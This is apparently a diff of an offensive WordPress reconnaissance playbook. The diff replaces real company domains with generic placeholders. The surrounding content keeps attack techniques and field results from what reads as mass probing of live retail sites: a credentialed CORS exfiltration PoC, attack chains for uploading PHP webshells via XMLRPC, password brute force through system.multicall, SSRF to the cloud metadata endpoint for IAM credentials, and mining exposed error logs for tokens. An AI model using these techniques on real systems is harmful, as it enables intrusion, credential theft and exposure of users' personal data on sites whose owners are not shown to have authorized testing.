@@ -207,7 +207,7 @@ The 401 on WooCommerce endpoints is **not a blocker** — if an admin is authent
 
 ### CORS Phishing PoC (for report)
 
-**Critical insight — CORS headers are set even on 404 responses for plugin API endpoints.** On defy.com, `/wp-json/gravity-pdf/v1/pdf/` returned HTTP 404 but still included `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`. A 404 endpoint with CORS credential reflection still enables CSRF-style attacks on plugin routes if the endpoint changes behavior based on authentication state.
+**Critical insight — CORS headers are set even on 404 responses for plugin API endpoints.** On entertainment-franchise.com, `/wp-json/gravity-pdf/v1/pdf/` returned HTTP 404 but still included `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`. A 404 endpoint with CORS credential reflection still enables CSRF-style attacks on plugin routes if the endpoint changes behavior based on authentication state.
 ```html
 <!doctype html><body><pre id="out"></pre>
 <script>
@@ -224,12 +224,12 @@ fetch("https://TARGET/wp-json/wp/v2/users", {credentials:"include"})
 **Critical confirmation sign:**
 ```
 === Found on 6 targets in mass recon ===
-- wines.com: 10 users exposed
-- restonic.com: 3 admins exposed
-- realpro.com: 3 users including 2 super admins
-- toolking.com: 1 super admin + PII
-- defy.com: 9 users + 2 corporate emails
-- biglots.com: CORS discovered in Wave 1 deep probe (NEW!)
+- ecommerce-wine.com: 10 users exposed
+- mattress-retailer.com: 3 admins exposed
+- realestate-platform.com: 3 users including 2 super admins
+- tools-retailer.com: 1 super admin + PII
+- entertainment-franchise.com: 9 users + 2 corporate emails
+- retail-chain.com: CORS discovered in Wave 1 deep probe (NEW!)
 ```
 
 ---
@@ -445,7 +445,7 @@ for route, info in d.get('routes', {}).items():
 # obtained via other means (XMLRPC brute force, source leak, etc.)
 ```
 
-**Field evidence:** biglots.com (Hostinger-hosted) had all 4 endpoints returning `rest_forbidden` (401). The `regenerate-bypass-code` endpoint is unique to Hostinger and not documented in standard WP plugin catalogs.
+**Field evidence:** retail-chain.com (Hostinger-hosted) had all 4 endpoints returning `rest_forbidden` (401). The `regenerate-bypass-code` endpoint is unique to Hostinger and not documented in standard WP plugin catalogs.
 
 ### Jetpack remote_register Probing
 
@@ -469,7 +469,7 @@ curl -sk -X POST "https://$TARGET/wp-json/jetpack/v4/remote_register" \
 # if nonce is leaked elsewhere (JS bundle, error log, CSP report)
 ```
 
-**Field evidence:** biglots.com Jetpack instance allowed parameter progression from `local_user_missing` → `nonce_missing` — confirming the remote registration endpoint is functional and only blocked by nonce authentication.
+**Field evidence:** retail-chain.com Jetpack instance allowed parameter progression from `local_user_missing` → `nonce_missing` — confirming the remote registration endpoint is functional and only blocked by nonce authentication.
 
 ---
 
@@ -497,7 +497,7 @@ curl -sk "https://$TARGET/" | grep -oP "wcSettings[^<]+" | head -5
 curl -sk "https://$TARGET/" | grep -oP "wc_[a-zA-Z0-9_]+:\s*['\"][^'\"]+['\"]" | head -10
 ```
 
-**Field evidence:** biglots.com had `Woo: 18734003671405:***` in `/wp-content/themes/sportiq/style.css`. Consumer Key confirmed: `ck_18734003671405`. The Consumer Secret suffix was redacted (5 chars), requiring brute force against the WC API.
+**Field evidence:** retail-chain.com had `Woo: 18734003671405:***` in `/wp-content/themes/sportiq/style.css`. Consumer Key confirmed: `ck_18734003671405`. The Consumer Secret suffix was redacted (5 chars), requiring brute force against the WC API.
 
 ### Azure AD / Login with Azure Plugin
 
@@ -523,7 +523,7 @@ for route, info in d.get('routes', {}).items():
 
 **Attack scenario:** If admin credentials are obtained (via XMLRPC brute force or LiteSpeed CVE), these endpoints become fully accessible — enabling extraction of corporate SharePoint documents, OneDrive files, and PowerBI reports.
 
-**Field evidence:** biglots.com had Login with Azure v2.2.7 active, exposing all 6 POST endpoints for SharePoint/OneDrive/PowerBI access.
+**Field evidence:** retail-chain.com had Login with Azure v2.2.7 active, exposing all 6 POST endpoints for SharePoint/OneDrive/PowerBI access.
 paths=(
   "/wp-json/wc/v3/"
   "/wp-json/wc/v3/products"
@@ -601,7 +601,7 @@ for ns in \
 done
 ```
 
-**Field evidence:** toolking.com had Slider Revolution confirmed via `/wp-json/sliderrevolution/sliders/` (HTTP 200 with 28KB of slider data). restonic.com had Gravity Forms confirmed via `/wp-json/gf/v2/` (HTTP 401). Elementor on toolking.com returned HTTP 500 on `/favorites` — revealing the WordPress fatal error page.
+**Field evidence:** tools-retailer.com had Slider Revolution confirmed via `/wp-json/sliderrevolution/sliders/` (HTTP 200 with 28KB of slider data). mattress-retailer.com had Gravity Forms confirmed via `/wp-json/gf/v2/` (HTTP 401). Elementor on tools-retailer.com returned HTTP 500 on `/favorites` — revealing the WordPress fatal error page.
 
 ### Phase 8.5 — Staging Environment Deep Probe
 
@@ -624,7 +624,7 @@ for path in /wp-admin/install.php /wp-admin/upgrade.php /wp-admin/setup-config.p
 done
 
 # 2. setup-config.php returning 409 means wp-config.php EXISTS — reveals the site is installed
-# staging.biglots.com returned HTTP 409 with: "The file wp-config.php already exists"
+# staging.retail-chain.com returned HTTP 409 with: "The file wp-config.php already exists"
 
 # 3. Full staging sweep
 for path in "/" "/.env" "/wp-json/" "/wp-json/wp/v2/users" \
@@ -637,7 +637,7 @@ for path in "/" "/.env" "/wp-json/" "/wp-json/wp/v2/users" \
 done
 ```
 
-**Why this matters:** staging.biglots.com had `/wp-admin/install.php` HTTP 200 (WordPress installation page), `/wp-admin/upgrade.php` HTTP 200, and `/wp-admin/setup-config.php` HTTP 409 (revealing wp-config.php exists). This is a potential foothold vector.
+**Why this matters:** staging.retail-chain.com had `/wp-admin/install.php` HTTP 200 (WordPress installation page), `/wp-admin/upgrade.php` HTTP 200, and `/wp-admin/setup-config.php` HTTP 409 (revealing wp-config.php exists). This is a potential foothold vector.
 
 ## Phase 9 — Debug Log & Config Exposure
 
@@ -667,7 +667,7 @@ done
 When an error_log file is found (especially a large one >100KB), DON'T just note it exists. Deep-analyze it:
 
 ```bash
-# When you find an error_log (e.g., /magical/error_log = 1.7MB from wines.com):
+# When you find an error_log (e.g., /magical/error_log = 1.7MB from ecommerce-wine.com):
 # Extract server paths (reveal docroot, user, hosting provider)
 grep -oP '/home/[^"]+' error_log | sort -u | head -10
 grep -oP '/var/www/[^"]+' error_log | sort -u | head -10
@@ -687,7 +687,7 @@ grep -oP '(in |on line )\S+' error_log | sort -u | head -30
 # Extract timestamps — error_logs spanning YEARS indicate legacy code still running
 head -1 error_log
 tail -1 error_log
-# e.g., wines.com had errors from 2013 — 11+ year old code on the same server
+# e.g., ecommerce-wine.com had errors from 2013 — 11+ year old code on the same server
 
 # Check for token/credential leakage
 grep -oP 'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}' error_log | head -5
@@ -730,7 +730,7 @@ grep -oP 'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}' "$ERROR
 # 7. Date range analysis — error logs spanning YEARS mean legacy code
 head -1 "$ERROR_LOG"
 tail -1 "$ERROR_LOG"
-# e.g., wines.com had errors from 2013 — 11+ year old code on the same server
+# e.g., ecommerce-wine.com had errors from 2013 — 11+ year old code on the same server
 
 # 8. PHP include/require paths (reveals plugin loading order and custom code)
 grep -iP '(require|include|require_once|include_once)\(.+\.php' "$ERROR_LOG" | head -20
@@ -738,7 +738,7 @@ grep -iP '(require|include|require_once|include_once)\(.+\.php' "$ERROR_LOG" | h
 
 **Why this matters:** PHP error_logs are often world-readable (644 permissions), contain full server path disclosures, span years of activity, and frequently contain SQL queries (with data), parsed credentials from register_globals era code, and __autoload() path attempts that reveal internal directory structure.
 
-**Field evidence:** wines.com had TWO error logs:
+**Field evidence:** ecommerce-wine.com had TWO error logs:
 - `/error_log`: **896,263,665 bytes (855MB)** — PHP errors from AWS/GoDaddy hosting, containing SQL queries, function call chains, and PII
 - `/magical/error_log`: 1,707,356 bytes — WordPress PHP parse errors from 2013, revealing the exact theme path and PHP parsing errors on legacy code
 
@@ -764,7 +764,7 @@ CORS credential reflection -> Malicious page hosted on attacker.com ->
 Victim admin visits while logged -> JS exfiltrates session cookie + CSRF token ->
 Session hijacking -> Full admin ATO
 ```
-**Found on:** wines.com, restonic.com, realpro.com, toolking.com, defy.com (5/7 deep targets)
+**Found on:** ecommerce-wine.com, mattress-retailer.com, realestate-platform.com, tools-retailer.com, entertainment-franchise.com (5/7 deep targets)
 
 ### Chain B: Open Registration + XMLRPC -> RCE
 ```
@@ -772,14 +772,14 @@ Open registration (anyone can create WP account) -> Create user ->
 XMLRPC wp.uploadFile with credentials -> Upload PHP webshell ->
 system('id') -> Full RCE
 ```
-**Found on:** wines.com (registration + exec functions available)
+**Found on:** ecommerce-wine.com (registration + exec functions available)
 
 ### Chain C: PHPInfo -> exec() -> RCE
 ```
 PHPInfo shows disable_functions only blocks pcntl_* (NOT exec/shell_exec/system) ->
 Upload webshell via any upload endpoint -> RCE via shell_exec('whoami')
 ```
-**Found on:** wines.com (exec, shell_exec, system, popen, proc_open ALL available)
+**Found on:** ecommerce-wine.com (exec, shell_exec, system, popen, proc_open ALL available)
 
 ### Chain D: Plugin CVE -> RCE
 ```
@@ -787,7 +787,7 @@ Slider Revolution detected (revslider.php exists) ->
 CVE-2024-2534 (RCE) or CVE-2022-2944 (SQLi) ->
 Exploit plugin vulnerability -> Webshell -> RCE
 ```
-**Found on:** toolking.com (Slider Revolution confirmed)
+**Found on:** tools-retailer.com (Slider Revolution confirmed)
 
 ### Chain E: XMLRPC system.multicall -> Brute Force -> RCE
 ```
@@ -795,7 +795,7 @@ XMLRPC with 80 methods including system.multicall ->
 Batch 100 passwords per request -> Bypass rate limiting ->
 Find valid credentials -> wp.uploadFile -> Webshell -> RCE
 ```
-**Found on:** wines.com, restonic.com, biglots.com
+**Found on:** ecommerce-wine.com, mattress-retailer.com, retail-chain.com
 
 ---
 
@@ -830,11 +830,11 @@ done
 **What can be found:**
 | Path | What it reveals | Example from field recon |
 |------|-----------------|--------------------------|
-| `/forum/`, `/board/`, `/wineboard/` | MyBB forum with user profiles, private messages, search | wines.com: 51KB MyBB forum at `/wineboard/` |
-| `/cgi-bin/`, `/lookup/`, `/search.cgi` | Old CGI scripts (Perl, classic ASP) with injection potential | wines.com: `/cgi-bin/encyclopedia/search.cgi` |
+| `/forum/`, `/board/`, `/wineboard/` | MyBB forum with user profiles, private messages, search | ecommerce-wine.com: 51KB MyBB forum at `/wineboard/` |
+| `/cgi-bin/`, `/lookup/`, `/search.cgi` | Old CGI scripts (Perl, classic ASP) with injection potential | ecommerce-wine.com: `/cgi-bin/encyclopedia/search.cgi` |
 | `/old/`, `/staging/`, `/beta/`, `/dev/` | Unmaintained CMS copies with older plugin versions | Common pattern across WP sites |
-| `/uploads/`, `/download/` | Directory listing enabled → file enumeration | biglots.com: WC log uploads exposed |
-| `/contact/`, `/style/`, `/ad-art/` | Forbidden directories (403) — may contain admin-only tools | wines.com: 3 paths return 403 |
+| `/uploads/`, `/download/` | Directory listing enabled → file enumeration | retail-chain.com: WC log uploads exposed |
+| `/contact/`, `/style/`, `/ad-art/` | Forbidden directories (403) — may contain admin-only tools | ecommerce-wine.com: 3 paths return 403 |
 
 **Why this matters:** Forum software (MyBB, phpBB) is frequently targeted by automated exploit tools and often runs on the same server with shared sessions/cookies as the main WordPress site. A compromised forum → session theft from WP admin who also uses the forum.
 
@@ -923,13 +923,13 @@ Before sending a single new request, read every prior finding file for the targe
 |----------------|----------------------|
 | **CORS credential reflection** (any endpoint) | Scan ALL REST endpoints (users, posts, pages, media, comments, settings, WC, GF, site-health, custom namespaces). Also check staging environments — they often have CORS too. |
 | **XMLRPC HTTP 200** | Enumerate ALL 80+ methods via POST. Test each dangerous method individually for faultCode. Check `pingback.ping` SSRF to cloud metadata + localhost. Test `system.multicall` for empty-array response (indicates no auth needed). |
-| **XMLRPC HTTP 405** | Still test via POST! 405 on GET doesn't mean POST is blocked — restonic.com and staging.biglots.com returned 405 on GET but POST with `Content-Type: text/xml` and valid method XML worked for all 80+ dangerous methods. The 405 is from the web server (LiteSpeed/nginx) blocking GET to .php files, not from WordPress rejecting XMLRPC. |
+| **XMLRPC HTTP 405** | Still test via POST! 405 on GET doesn't mean POST is blocked — mattress-retailer.com and staging.retail-chain.com returned 405 on GET but POST with `Content-Type: text/xml` and valid method XML worked for all 80+ dangerous methods. The 405 is from the web server (LiteSpeed/nginx) blocking GET to .php files, not from WordPress rejecting XMLRPC. |
 | **PHPInfo exposed** | Probe for webshells (shell.php, cmd.php, c99.php, etc.) and backup files (backup.zip, dump.sql, wp-config.*.old) in the same directory and adjacent paths. Check directory listing on uploads. |
 | **ElementsKit detected** | Test admin-ajax.php with `action=elementskit_upload_file` — if HTTP 400/200 instead of 404, the action registration function is accessible (CVE-2023-6853 vector). Check ElementsKit REST namespace paths. |
 | **Slider Revolution detected** | Try reading readme.txt for version. Test revslider_ajax_action in admin-ajax.php. Check for public assets revealing version (rs6.min.js). |
 | **Yoast sitemap** | Check `/author-sitemap.xml` for email disclosure (slugs like `adminleasemymarketing-com` decode to `admin@leasemarketing.com`). |
 | **Debug log exposed** (`/wp-content/debug.log`) | Grep for SQL queries, JWT tokens, API keys, emails, internal IPs. |
-| **Error log exposed** (`/error_log`, `/magical/error_log`, etc.) | Download the file (it may be very large — 1.7MB found on wines.com). Extract: server paths (reveals docroot, hosting provider), SQL queries (may contain credentials), PHP error types (Parse/Warning/Fatal reveal code quality), timestamps spanning years (legacy code still running), and email addresses. Even single PHP parse errors reveal the exact theme/plugin file paths. |
+| **Error log exposed** (`/error_log`, `/magical/error_log`, etc.) | Download the file (it may be very large — 1.7MB found on ecommerce-wine.com). Extract: server paths (reveals docroot, hosting provider), SQL queries (may contain credentials), PHP error types (Parse/Warning/Fatal reveal code quality), timestamps spanning years (legacy code still running), and email addresses. Even single PHP parse errors reveal the exact theme/plugin file paths. |
 | **WooCommerce API (401)** | 401 ≠ blocked. With valid admin session, 401 becomes 200. Test CORS: if 401 endpoint has CORS headers, data is still exfiltratable cross-origin. |
 | **Open registration confirmed** | Register a test account. Then test XMLRPC upload with those credentials. |
 | **Subdomains found** | Check each for live HTTP service, especially `staging.*`, `dev.*`, `api.*`, `vpn.*`, `bitbucket.*`. Staging environments are frequently less hardened. |
@@ -992,8 +992,8 @@ Interpretation of fault codes:
 
 ### 12.5 Staging Environment Deep Probe
 
-When a staging subdomain is discovered (e.g., `staging.biglots.com`), it is frequently **LESS HARDENED than production**:
-- Users endpoint often exposed (biglots.com staging had 4 users vs production's rest_no_route)
+When a staging subdomain is discovered (e.g., `staging.retail-chain.com`), it is frequently **LESS HARDENED than production**:
+- Users endpoint often exposed (retail-chain.com staging had 4 users vs production's rest_no_route)
 - CORS credential reflection may be present on staging even if production is patched
 - Default WordPress posts ("Hello world!") indicate inactive/incomplete setup
 - wp-login.php frequently accessible without rate limiting
@@ -1014,7 +1014,7 @@ done
 
 #### 12.5.1 Staging XMLRPC — Always Test Via POST Even When GET Returns 405
 
-Staging environments frequently block GET requests to xmlrpc.php (returning 405) but **fully accept POST with XML content type**, yielding all 80+ methods. Example: staging.biglots.com — GET → 405, POST with Content-Type: text/xml → 80 methods with system.multicall, pingback.ping, wp.uploadFile.
+Staging environments frequently block GET requests to xmlrpc.php (returning 405) but **fully accept POST with XML content type**, yielding all 80+ methods. Example: staging.retail-chain.com — GET → 405, POST with Content-Type: text/xml → 80 methods with system.multicall, pingback.ping, wp.uploadFile.
 
 ```bash
 # Test staging XMLRPC — MUST use POST with XML Content-Type
@@ -1054,7 +1054,7 @@ print('faultCode ' + fc.group(1) if fc else 'no fault')
 done
 ```
 
-**faultCode 0 means SSRF accepted** — the server attempted to fetch the URL. staging.biglots.com returned faultCode 0 for http://169.254.169.254/, enabling potential AWS IAM credential extraction.
+**faultCode 0 means SSRF accepted** — the server attempted to fetch the URL. staging.retail-chain.com returned faultCode 0 for http://169.254.169.254/, enabling potential AWS IAM credential extraction.
 
 #### 12.7 Port Scan Followup — MySQL and Non-standard Services
 
@@ -1099,7 +1099,7 @@ else
 fi
 ```
 
-**Field evidence:** wines.com returned `.git/HEAD` at HTTP 200 with 69KB of SPA HTML content (WordPress page header, not git data). This was a false positive caused by the SPA's catch-all routing.
+**Field evidence:** ecommerce-wine.com returned `.git/HEAD` at HTTP 200 with 69KB of SPA HTML content (WordPress page header, not git data). This was a false positive caused by the SPA's catch-all routing.
 
 Staging WordPress often exposes `/wp-json/wp/v2/users` completely (no auth required):
 
@@ -1168,7 +1168,7 @@ For operations spanning multiple targets (e.g., a Wave 2 across 7 sites), use th
 
 ```bash
 # Multi-target dispatch pattern
-for target in wines.com restonic.com toolking.com realpro.com; do
+for target in ecommerce-wine.com mattress-retailer.com tools-retailer.com realestate-platform.com; do
   (
     # Per-target probe logic here...
     sleep $((RANDOM % 5))  # stagger start times
@@ -1263,7 +1263,7 @@ def scan_js_for_secrets(text):
 
 **Failing pattern** (hangs on unresolvable subdomains):
 ```python
-requests.get("https://staging.biglots.com", timeout=8)  # ❌ time out 8s applies to connect/read only; DNS can hang 30-60s
+requests.get("https://staging.retail-chain.com", timeout=8)  # ❌ time out 8s applies to connect/read only; DNS can hang 30-60s
 ```
 
 **Two fixes:**
@@ -1272,7 +1272,7 @@ requests.get("https://staging.biglots.com", timeout=8)  # ❌ time out 8s applie
 ```python
 import socket
 socket.setdefaulttimeout(10)  # caps DNS resolution too
-requests.get("https://staging.biglots.com")  # ✅ total time ≤ 10s
+requests.get("https://staging.retail-chain.com")  # ✅ total time ≤ 10s
 ```
 
 **Fix B — curl subprocess** (most robust for subdomain probes):
@@ -1281,7 +1281,7 @@ import subprocess
 # curl's --max-time DOES cover DNS
 result = subprocess.run(
     ["curl", "-sk", "--max-time", "8", "-o", "/tmp/out",
-     "-w", "%{http_code}", "https://staging.biglots.com/"],
+     "-w", "%{http_code}", "https://staging.retail-chain.com/"],
     capture_output=True, timeout=10
 )
 code = result.stdout.decode().strip()
@@ -1322,7 +1322,7 @@ for line in sys.stdin:
 **Critical workflow correction:** If `system.multicall` returns faultCode 403 for all passwords in your wordlist (or you have no wordlist at all), do NOT keep enlarging the wordlist indefinitely. The brute force confirmed the endpoint works (487 pwds/request demonstrated on field targets), but the password simply isn't in your wordlist. Shift to **lateral enumeration** immediately — it often finds MORE impact than the brute force ever would.
 
 ### Why Lateral Thinking Wins
-A frontal assault (brute force, port scan, directory fuzzing) finds the obvious. Lateral moves find the forgotten. In field testing on restonic.com:
+A frontal assault (brute force, port scan, directory fuzzing) finds the obvious. Lateral moves find the forgotten. In field testing on mattress-retailer.com:
 - Brute force: 3 users x 487 passwords = 1,461 attempts — **zero credentials**
 - Lateral enumeration: **23 REST namespaces, 62 Yoast routes, 87 WC Analytics routes, 43,981 sitemap URLs, functional Cart Token API, wp-abilities/run endpoint, 25 subdomains, 14 functional retailer locations**
 
